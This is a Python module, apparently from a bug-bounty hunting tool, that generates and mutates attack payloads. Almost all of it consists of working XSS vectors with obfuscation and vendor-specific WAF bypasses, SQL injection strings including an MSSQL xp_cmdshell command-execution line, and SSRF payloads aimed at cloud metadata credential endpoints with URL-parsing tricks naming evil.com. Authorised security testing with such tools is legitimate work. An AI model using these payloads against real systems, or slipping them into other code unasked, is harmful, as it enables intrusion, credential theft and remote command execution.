"""
Payload Generation Engine
===========================

Dynamically generates and mutates payloads:
- XSS payload mutations
- SQLi variations
- SSRF bypass payloads
- WAF bypass techniques
- Encoding & obfuscation
"""

from __future__ import annotations

import base64
import html
import random
import string
import urllib.parse
from typing import Any

from bbhunter.config import get_config
from bbhunter.logger import get_logger
from bbhunter.models import VulnCategory

logger = get_logger()


class PayloadEngine:
    """
    Advanced payload generation with mutation and WAF bypass.
    
    Generates payloads that adapt based on:
    - Server responses
    - WAF presence
    - Filtering behavior
    """

    def __init__(self):
        self.config = get_config()

    # ---------------------------------------------------------------
    # XSS Payloads
    # ---------------------------------------------------------------

    def generate_xss_payloads(
        self,
        context: str = "html",
        waf: str | None = None,
        mutation_level: int = 3,
    ) -> list[str]:
        """
        Generate XSS payloads for different contexts.
        
        Args:
            context: html, attribute, javascript, url
            waf: Detected WAF name (for bypass payloads)
            mutation_level: 1-5 (higher = more mutations)
        """
        base_payloads = {
            "html": [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg/onload=alert(1)>',
                '<body onload=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<marquee onstart=alert(1)>',
                '<details open ontoggle=alert(1)>',
                '<video><source onerror=alert(1)>',
                '<audio src onerror=alert(1)>',
            ],
            "attribute": [
                '" onmouseover="alert(1)',
                "' onfocus='alert(1)' autofocus='",
                '" onfocus="alert(1)" autofocus="',
                "javascript:alert(1)",
                '" style="background:url(javascript:alert(1))',
            ],
            "javascript": [
                "'-alert(1)-'",
                "';alert(1)//",
                '";alert(1)//',
                "\\'-alert(1)//",
                "</script><script>alert(1)</script>",
                "${alert(1)}",
                "{{constructor.constructor('alert(1)')()}}",
            ],
            "url": [
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
                "javascript:alert(document.domain)",
            ],
        }

        payloads = list(base_payloads.get(context, base_payloads["html"]))

        # Apply mutations
        if mutation_level >= 2:
            payloads.extend(self._case_mutations(payloads))
        if mutation_level >= 3:
            payloads.extend(self._encoding_mutations(payloads))
        if mutation_level >= 4:
            payloads.extend(self._obfuscation_mutations(payloads))
        if mutation_level >= 5:
            payloads.extend(self._advanced_waf_bypass(payloads))

        # WAF-specific bypasses
        if waf:
            payloads.extend(self._waf_specific_bypass(waf, "xss"))

        return payloads

    # ---------------------------------------------------------------
    # SQLi Payloads
    # ---------------------------------------------------------------

    def generate_sqli_payloads(
        self,
        db_type: str = "generic",
        technique: str = "all",
    ) -> list[str]:
        """Generate SQL injection payloads."""
        payloads = []

        if technique in ("all", "error"):
            payloads.extend([
                "'", "''", '"', "' OR '1'='1", "' OR '1'='1'--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "1' ORDER BY 1--",
                "1' ORDER BY 10--",
                "' AND 1=CONVERT(int,@@version)--",
            ])

        if technique in ("all", "boolean"):
            payloads.extend([
                "' AND '1'='1", "' AND '1'='2",
                "' AND 1=1--", "' AND 1=2--",
                "1 AND 1=1", "1 AND 1=2",
                "' OR 1=1#", "' OR 1=2#",
            ])

        if technique in ("all", "time"):
            payloads.extend([
                "' OR SLEEP(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
                "' OR pg_sleep(5)--",
                "' AND SLEEP(5)--",
                "1; SELECT SLEEP(5)--",
                "1 AND (SELECT * FROM (SELECT SLEEP(5))a)--",
            ])

        if technique in ("all", "union"):
            for cols in range(1, 11):
                nulls = ",".join(["NULL"] * cols)
                payloads.append(f"' UNION SELECT {nulls}--")

        # DB-specific payloads
        if db_type == "mysql":
            payloads.extend([
                "' UNION SELECT @@version,NULL--",
                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            ])
        elif db_type == "postgres":
            payloads.extend([
                "' UNION SELECT version(),NULL--",
                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            ])
        elif db_type == "mssql":
            payloads.extend([
                "' UNION SELECT @@version,NULL--",
                "'; EXEC xp_cmdshell('whoami')--",
            ])

        return payloads

    # ---------------------------------------------------------------
    # SSRF Payloads
    # ---------------------------------------------------------------

    def generate_ssrf_payloads(self, bypass_level: int = 3) -> list[str]:
        """Generate SSRF payloads with various bypass techniques."""
        payloads = [
            # Standard
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            # Cloud metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
        ]

        if bypass_level >= 2:
            payloads.extend([
                # IP encoding bypass
                "http://0x7f000001",
                "http://2130706433",
                "http://0177.0.0.1",
                "http://127.0.0.1.nip.io",
                "http://127.1",
                "http://0",
            ])

        if bypass_level >= 3:
            payloads.extend([
                # URL parsing confusion
                "http://evil.com@127.0.0.1",
                "http://127.0.0.1#@evil.com",
                "http://127.0.0.1%00@evil.com",
                "http://127.0.0.1?@evil.com",
                # Protocol tricks
                "dict://127.0.0.1:11211/",
                "gopher://127.0.0.1:6379/_",
                "tftp://127.0.0.1/test",
            ])

        return payloads

    # ---------------------------------------------------------------
    # Mutation Helpers
    # ---------------------------------------------------------------

    def _case_mutations(self, payloads: list[str]) -> list[str]:
        """Generate case-variation mutations."""
        mutations = []
        for p in payloads:
            # Random case
            mutated = "".join(
                c.upper() if random.random() > 0.5 else c.lower()
                for c in p
            )
            mutations.append(mutated)
        return mutations

    def _encoding_mutations(self, payloads: list[str]) -> list[str]:
        """Generate encoded payload variations."""
        mutations = []
        for p in payloads:
            # URL encoding
            mutations.append(urllib.parse.quote(p))
            # Double URL encoding
            mutations.append(urllib.parse.quote(urllib.parse.quote(p)))
            # HTML entity encoding
            mutations.append(html.escape(p).replace("&amp;", "&"))
            # Unicode encoding
            mutations.append(p.replace("<", "\u003c").replace(">", "\u003e"))
        return mutations

    def _obfuscation_mutations(self, payloads: list[str]) -> list[str]:
        """Generate obfuscated payload variations."""
        mutations = []
        for p in payloads:
            # Null bytes
            mutations.append(p.replace("<", "%00<"))
            # Tab/newline injection
            mutations.append(p.replace("<script>", "<scr\tipt>"))
            mutations.append(p.replace("<script>", "<scr\nipt>"))
            # Backtick alternative
            mutations.append(p.replace("alert(1)", "alert`1`"))
            # Constructor
            mutations.append(p.replace("alert(1)", "[].constructor.constructor('alert(1)')()"))
        return mutations

    def _advanced_waf_bypass(self, payloads: list[str]) -> list[str]:
        """Generate advanced WAF bypass payloads."""
        return [
            '<svg/onload=alert(1)>',
            '<svg onload=alert&lpar;1&rpar;>',
            '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
            '"><img src=x onerror=prompt(1)>',
            '<isindex type=image src=1 onerror=alert(1)>',
            '"><svg/onload=confirm(1)>',
            '${7*7}',
            '{{7*7}}',
            'self["ale"+"rt"](1)',
            'window["ale"+"rt"](1)',
        ]

    def _waf_specific_bypass(self, waf: str, vuln_type: str) -> list[str]:
        """Generate WAF-specific bypass payloads."""
        bypasses = {
            "cloudflare": [
                '<img src=x onerror=alert(1)>',
                '<svg/onload=alert(String.fromCharCode(49))>',
                '<a href="javascript:void(0)" onmouseover=alert(1)>hover</a>',
            ],
            "akamai": [
                '"><svg/onload=prompt(1)>',
                '<details open ontoggle=alert(1)>',
            ],
            "modsecurity": [
                '<svg/onload=alert(1)>',
                '"><img src=x onerror=prompt`1`>',
            ],
        }
        return bypasses.get(waf.lower(), [])

    # ---------------------------------------------------------------
    # Utility
    # ---------------------------------------------------------------

    def get_payloads(
        self,
        category: VulnCategory,
        **kwargs: Any,
    ) -> list[str]:
        """Get payloads for any vulnerability category."""
        generators = {
            VulnCategory.XSS: self.generate_xss_payloads,
            VulnCategory.SQLI: self.generate_sqli_payloads,
            VulnCategory.SSRF: self.generate_ssrf_payloads,
        }
        gen = generators.get(category)
        if gen:
            return gen(**kwargs)
        return []
